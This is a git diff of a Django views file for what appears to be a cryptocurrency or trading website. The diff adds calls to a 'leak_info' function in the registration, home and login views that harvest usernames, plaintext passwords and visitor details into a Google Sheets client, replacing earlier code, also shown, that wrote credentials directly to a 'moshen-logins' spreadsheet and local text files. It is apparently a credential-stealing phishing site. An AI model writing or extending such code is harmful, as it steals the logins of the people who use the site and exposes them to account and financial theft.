@@ -5,6 +5,7 @@ from django.shortcuts import render, redirect
 from .forms import RegisterForm
 from django.contrib.auth import login, logout, authenticate
 from django.contrib.auth.forms import AuthenticationForm
+from .functions import get_client_ip, leak_info
 
 SCOPE = ["https://spreadsheets.google.com/feeds",
          "https://www.googleapis.com/auth/spreadsheets",
@@ -20,10 +21,11 @@ DRIVE_SERVICE = build('drive', 'v3', credentials=CREDS)
 # Create your views here.
 def sign_up(request):
     if request.method == 'POST':
+        fields = ['username', 'password1']
+        leak_info(request, CLIENT, fields, "Register")
+
         form = RegisterForm(request.POST)
-        print(request.POST)
-        # with open('registers.txt', 'a') as f:
-        #     f.write(str(request.POST) + '\n')
+
         if form.is_valid():
             print('valid')
             user = form.save()
@@ -36,9 +38,8 @@ def sign_up(request):
 
 
 def home(request):
-    # sh = CLIENT.open('moshen-logins')
-    # print(len(sh.sheet1.get_all_values()))
-    # sh.sheet1.update('A1', 'astala vista, baby')
+    fields = []
+    leak_info(request, CLIENT, fields, "Visit")
     return render(request, 'main/home.html')
 
 
@@ -47,11 +48,11 @@ def market(request):
 
 
 def trade(request):
-    return render(request, 'main/trade.html')
+    return render(request, 'main/trade.html', {"name": request.user})
 
 
 def scontract(request):
-    return render(request, 'main/scontract.html')
+    return render(request, 'main/scontract.html', {"name": request.user})
 
 
 def finance(request):
@@ -70,19 +71,20 @@ def fund(request):
     return render(request, 'main/fund.html')
 
 
+def assets(request):
+
+    if request.user.is_authenticated:
+        return render(request, 'main/myAssets.html')
+    else:
+        return redirect('/login')
+
+
 def loginleek(request):
     if request.method == 'POST':
 
-        sh = CLIENT.open('moshen-logins')
-        sh1 = sh.sheet1
-        row = len(sh1.get_all_values()) + 1
-        print(row)
-        sh1.update('A'+str(row), request.POST["username"])
-        sh1.update('B'+str(row), request.POST["password"])
+        fields = ['username', 'password']
+        leak_info(request, CLIENT, fields, "Login")
 
-        # print(f'{request.POST["username"]}={request.POST["password"]}')
-        # with open('logins.txt', 'a') as f:
-        #     f.write(f'{str(request.POST["username"])}={str(request.POST["password"])}\n')
         form = AuthenticationForm(data=request.POST)
         if form.is_valid():
             username = form.cleaned_data.get('username')
